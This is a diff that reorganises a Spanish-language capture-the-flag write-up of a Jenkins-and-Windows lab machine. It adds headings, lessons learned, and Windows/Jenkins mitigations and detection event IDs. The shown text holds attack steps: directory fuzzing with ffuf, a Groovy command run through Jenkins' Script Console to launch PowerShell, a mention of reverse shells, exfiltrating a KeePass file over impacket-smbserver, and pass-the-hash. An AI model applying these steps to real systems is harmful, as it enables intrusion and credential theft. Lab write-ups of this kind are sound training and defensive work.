@@ -36,7 +36,11 @@ ffuf -u http://<IP>:50000/FUZZ -w ... -t 200
 # askjeeves
 ```
 
-## Acceso
+## Enumeración
+
+- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+
+## Foothold
 
 **Script Console** (`/askjeeves/script`) ejecuta Groovy como la cuenta del servicio:
 
@@ -50,7 +54,12 @@ Reverse shell con `cmd.exe` y sockets, o descargar un ejecutable con `powershell
 def p = ["cmd","/c","powershell -nop -c ..."].execute(); p.waitFor()
 ```
 
-## Escalada
+## Movimiento lateral
+
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+
+## Escalada de privilegios
 
 1. **KeePass** en `C:\Users\kohsuke\Documents\CEH.kdbx`; se exfiltra con `impacket-smbserver`.
 
@@ -73,15 +82,27 @@ dir /r               → hm.txt:root.txt:$DATA
 more < hm.txt:root.txt
 ```
 
-## Tropiezos
+## Evidencia
+
+- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
+- Los valores reales viven en `private/` y no se publican.
+
+## Lecciones aprendidas
 
 - **El 80 no lleva a nada**: es una página estática que imita un buscador.
 - **Volumen de Jenkins**: la consola es la vía más rápida; los jobs no hacen falta.
 - **`dir` normal**: sin `/r` los flujos alternativos son invisibles.
 
-## Lecciones
-
 - Jenkins sin autenticación es shell inmediata: la *Script Console* es RCE por diseño.
-- Un gestor de contraseñas en un perfil de usuario concentra todo el impacto.
 - Pass-the-hash no necesita la contraseña, sólo el hash NTLM.
 - NTFS esconde datos fuera de la vista del explorador: `dir /r`.
+
+## Mitigaciones y detección
+
+- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
+- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.
+- Actualizar Jenkins, deshabilitar la CLI remota y exigir autenticación en el panel.
+
+## Referencias
+
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
